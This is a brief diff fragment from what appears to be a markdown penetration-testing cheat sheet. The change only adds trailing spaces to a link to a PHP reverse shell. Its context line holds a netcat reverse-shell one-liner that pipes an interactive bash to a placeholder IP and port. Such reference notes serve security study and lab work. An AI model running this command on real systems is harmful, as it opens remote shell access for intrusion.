@@ -25,7 +25,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip-address> <port
 ```
 
 ### php reverse shell
-> https://github.com/pentestmonkey/php-reverse-shell
+> https://github.com/pentestmonkey/php-reverse-shell  
 Remember to change the ip-address and port
 
 ## Upgrading simple shells to fully interactive TTYs
